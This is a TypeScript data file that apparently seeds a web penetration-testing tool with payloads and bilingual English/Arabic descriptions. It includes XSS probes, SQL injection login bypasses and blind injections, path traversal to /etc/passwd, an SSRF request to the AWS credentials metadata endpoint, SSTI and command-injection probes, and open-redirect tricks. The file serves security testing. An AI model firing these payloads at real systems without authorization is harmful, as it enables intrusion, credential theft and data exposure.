export interface Payload {
  id: string;
  name: string;
  content: string;
  type: string;
  description?: { en: string; ar: string };
  isCustom?: boolean;
}

export const defaultPayloads: Payload[] = [
  // XSS
  {
    id: 'p1',
    name: 'XSS Basic Alert',
    content: '<script>alert(1)</script>',
    type: 'XSS',
    description: { en: 'Basic Reflected XSS. Often blocked by WAFs.', ar: 'ثغرة XSS انعكاسية بسيطة. غالباً ما تُحظر بواسطة الجدران النارية.' }
  },
  {
    id: 'p2',
    name: 'XSS SVG/Onload',
    content: '<svg/onload=alert(1)>',
    type: 'XSS',
    description: { en: 'Common bypass for <script> tag filters. Uses SVG contexts.', ar: 'تخطي شائع لفلاتر علامة <script>. يستخدم سياقات الـ SVG.' }
  },
  {
    id: 'p3',
    name: 'XSS Polyglot',
    content: 'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
    type: 'XSS',
    description: { en: 'Breaks out of multiple HTML contexts (attributes, tags, strings). Extremely useful for blind tests.', ar: 'يخترق سياقات HTML متعددة (السمات، العلامات، النصوص). مفيد جداً للاختبارات العمياء.' }
  },
  {
    id: 'x1',
    name: 'XSS Image Error',
    content: '<img src=x onerror=alert(document.domain)>',
    type: 'XSS',
    description: { en: 'Trigger XSS via failed image load.', ar: 'تشغيل XSS عبر فشل تحميل صورة.' }
  },

  // SQLi
  {
    id: 'p4',
    name: 'SQLi Auth Bypass (OR)',
    content: "' OR '1'='1",
    type: 'SQLi',
    description: { en: 'Classic authentication bypass. Makes the SQL statement always true.', ar: 'تخطي المصادقة الكلاسيكي. يجعل استعلام الـ SQL صحيحاً دائماً.' }
  },
  {
    id: 's1',
    name: 'SQLi Auth Bypass (Admin)',
    content: "admin' -- -",
    type: 'SQLi',
    description: { en: 'Logs in as admin by commenting out the password check.', ar: 'تسجيل الدخول كمدير عبر تهميش فحص كلمة المرور.' }
  },
  {
    id: 'p5',
    name: 'SQLi Time Based (MySQL)',
    content: "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
    type: 'SQLi',
    description: { en: 'MySQL time-based blind injection. Server will wait 5 seconds before responding.', ar: 'حقن SQL زمني أعمى لـ MySQL. سينتظر السيرفر 5 ثوانٍ قبل الرد.' }
  },
  {
    id: 'p6',
    name: 'SQLi Time Based (PostgreSQL)',
    content: "1'; SELECT pg_sleep(5)--",
    type: 'SQLi',
    description: { en: 'PostgreSQL time-based blind injection.', ar: 'حقن SQL زمني لـ PostgreSQL.' }
  },
  {
    id: 's2',
    name: 'SQLi Error Based (Extract)',
    content: "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
    type: 'SQLi',
    description: { en: 'MySQL Error-based extraction. Forces DB to throw an error containing the version.', ar: 'استخراج بالاعتماد على الأخطاء لـ MySQL. يجبر القاعدة على إظهار الإصدار داخل رسالة الخطأ.' }
  },

  // LFI / Path Traversal
  {
    id: 'p7',
    name: 'LFI /etc/passwd',
    content: '../../../../../../../../etc/passwd',
    type: 'LFI',
    description: { en: 'Read /etc/passwd Linux system file. Classic LFI payload.', ar: 'قراءة ملف /etc/passwd في لينكس. حمولة شائعة.' }
  },
  {
    id: 'p8',
    name: 'LFI PHP Wrapper (Base64)',
    content: 'php://filter/read=convert.base64-encode/resource=index.php',
    type: 'LFI',
    description: { en: 'Reads PHP source code encoded in Base64 (prevents execution of the script).', ar: 'قراءة أكواد PHP المرجعية مشفرة بـ Base64 (لمنع تنفيذها).' }
  },
  {
    id: 'p9',
    name: 'LFI Null Byte Bypass',
    content: '../../../../../../../../etc/passwd%00.jpg',
    type: 'LFI',
    description: { en: 'Null byte injection to bypass file extension checks (Older PHP versions).', ar: 'تخطي فحص امتداد الملفات باستخدام Null Byte (في إصدارات PHP القديمة).' }
  },
  {
    id: 'l1',
    name: 'LFI Windows Boot.ini',
    content: '..\\..\\..\\..\\..\\..\\..\\..\\boot.ini',
    type: 'LFI',
    description: { en: 'Path traversal for Windows servers.', ar: 'ثغرة مسار الخوادم التي تعمل بـ Windows.' }
  },

  // SSRF
  {
    id: 'p10',
    name: 'SSRF Localhost (Decimal)',
    content: 'http://2130706433/',
    type: 'SSRF',
    description: { en: 'Decimal IP representation of 127.0.0.1. Often bypasses basic regex filters.', ar: 'تمثيل عشري لـ 127.0.0.1. يتخطى فلاتر النصوص البسيطة غالباً.' }
  },
  {
    id: 'p11',
    name: 'SSRF AWS Metadata',
    content: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    type: 'SSRF',
    description: { en: 'AWS metadata endpoint. Can extract IAM roles and temporary credentials.', ar: 'مسار البيانات الوصفية في AWS. يمكن استخدامه لاستخراج صلاحيات وباسووردات مؤقتة للمخدم.' }
  },
  {
    id: 'ss1',
    name: 'SSRF Localhost (IPv6)',
    content: 'http://[::]:80/',
    type: 'SSRF',
    description: { en: 'IPv6 representation of localhost. Bypasses IPv4 blacklists.', ar: 'تمثيل IPv6 للسيرفر المحلي. لتخطي قوائم حظر الـ IPv4.' }
  },

  // SSTI
  {
    id: 'p12',
    name: 'SSTI Twig/Jinja2',
    content: '{{7*7}}',
    type: 'SSTI',
    description: { en: 'Basic Server-Side Template Injection test. Look for "49" in response.', ar: 'اختبار حقن قوالب الخادم (SSTI) البسيط. ابحث عن النتيجة "49".' }
  },
  {
    id: 'sst1',
    name: 'SSTI Java/Spring',
    content: '${7*7}',
    type: 'SSTI',
    description: { en: 'SSTI payload for Java environments like Spring or FreeMarker.', ar: 'حمولة SSTI لبيئات الجافا.' }
  },

  // RCE / Command Injection
  {
    id: 'p13',
    name: 'RCE Ping Test',
    content: '; ping -c 3 127.0.0.1 ;',
    type: 'RCE',
    description: { en: 'Basic command termination. If time delays by 3s, RCE is confirmed.', ar: 'التأكد من كسر الأمر. إذا تأخر السيرفر 3 ثوانٍ، فالاختراق مؤكد.' }
  },
  {
    id: 'c1',
    name: 'RCE Sleep (Blind)',
    content: '| sleep 10 #',
    type: 'RCE',
    description: { en: 'Blind RCE test using pipe. Look for 10s delay.', ar: 'اختبار RCE أعمى. ابحث عن تأخير قدره 10 ثوانٍ.' }
  },

  // Open Redirect
  {
    id: 'p14',
    name: 'Open Redirect (Protocol-Relative)',
    content: '//google.com/%2F..',
    type: 'Redirect',
    description: { en: 'Protocol-relative URL for open redirect bypass.', ar: 'تخطي تحويل المسار المفتوح باستخدام روابط نسبية لتخطي فحص (http).' }
  },
  {
    id: 'o1',
    name: 'Open Redirect (.bypass)',
    content: 'https://target.com.evil.com',
    type: 'Redirect',
    description: { en: 'Bypasses filters that only check if the domain STARTS with the target name.', ar: 'يتخطى الفلاتر التي تتأكد فقط إذا كان الرابط "يبدأ" باسم الموقع.' }
  }
];
